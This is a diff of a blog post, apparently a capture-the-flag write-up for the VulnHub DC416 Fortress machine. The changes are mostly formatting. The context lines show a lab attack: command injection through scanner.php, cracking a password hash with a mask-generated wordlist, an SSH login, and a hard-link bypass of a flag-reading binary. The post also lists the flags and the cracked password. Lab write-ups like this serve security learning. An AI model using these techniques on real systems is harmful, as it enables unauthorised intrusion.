@@ -12,13 +12,14 @@ image = "/img/misc/vulnhub.png"
 
 Here are my other writeups for the DC416 challenges:
 
-* [DC416 Basement](/post/vulnhub_dc416_basement/)
-* [DC416 Baffle](/post/vulnhub_dc416_baffle/)
-* [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
+- [DC416 Basement](/post/vulnhub_dc416_basement/)
+- [DC416 Baffle](/post/vulnhub_dc416_baffle/)
+- [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
 
 # information gathering
 
 A nmap scan of the machine reveals a FreeBSD server with a webserver present.
+
 ```
 root@kali:~# nmap -sS -p- -A 192.168.56.2
 Nmap scan report for 192.168.56.2
@@ -44,6 +45,7 @@ PORT    STATE SERVICE  VERSION
 ```
 
 The webserver contains the following rules
+
 ```
 Engagement Rules:
 
@@ -105,6 +107,7 @@ By playing around with the input we can completely modify the command like addin
 We can now also view the source code of `scanner.php` to verify the filtering taking place:
 
 `cat scanner.php`
+
 ```php
 <html>
 <head>
@@ -148,6 +151,7 @@ if(isset($_POST['host'])) {
 ```
 
 Next we examine the other files present
+
 ```
 total 144
 drwxr-xr-x  4 root  wheel   512B Nov  9 20:24 .
@@ -161,6 +165,7 @@ drwxr-xr-x  2 root  wheel   512B Nov  9 20:22 s1kr3t
 ```
 
 The first flag can be found in the `s1kr3t` directory.
+
 ```
 cat s1kr3t/flag.txt
 FLAG{n0_one_br3aches_teh_f0rt}
@@ -181,11 +186,13 @@ craven:*:1002:1002:User &:/home/craven:/bin/sh
 So we now have a hash for the user `craven`. If we look at raven's home directory under `/home/craven` we can see an unreadable `flag.txt`, `hint.txt` and `reminder.txt`.
 
 The hint says:
+
 ```
 Keep forgetting my password, so I made myself a hint. Password is three digits followed by my pet's name and a symbol.
 ```
 
 And the reminder:
+
 ```
 To buy:
 * skim milk
@@ -199,6 +206,7 @@ So it looks like `craven` owns a dog named `qwerty` and uses it as part of his p
 The next step is to create a custom wordlist using the pattern from the hint. We use [Hashcat Maskprocessor](https://github.com/hashcat/maskprocessor) for this purpose.
 
 After building the source code we can generate all possible passwords by running the following command:
+
 ```
 ./mp64.bin ?d?d?dqwerty?s > pass.txt
 ```
@@ -262,6 +270,7 @@ Stopped: Fri Jan 13 22:25:29 2017
 So we found cravens password: `931qwerty?`.
 
 Now we can try to login as `craven` via SSH to see if the password is valid and get the next flag.
+
 ```
 ssh craven@192.168.56.2
 $ cat flag.txt
@@ -289,6 +298,7 @@ Win, here's your flag:
 ```
 
 It seems the binary checks the filename for `flag.txt` so let's try to trick this check with a symbolic link:
+
 ```
 $ ln -s /home/vulnhub/flag.txt /tmp/test
 $ ./reader /tmp/test
@@ -297,6 +307,7 @@ Symbolic links not allowed!
 ```
 
 Bummer, no symbolic links allowed. So let's try to use a hard link:
+
 ```
 $ ln -f /home/vulnhub/flag.txt /tmp/test
 $ ./reader /tmp/test
@@ -310,6 +321,7 @@ FLAG{its_A_ph0t0_ph1ni5h}
 Done!
 
 # flags
+
 ```
 FLAG{n0_one_br3aches_teh_f0rt}
 FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
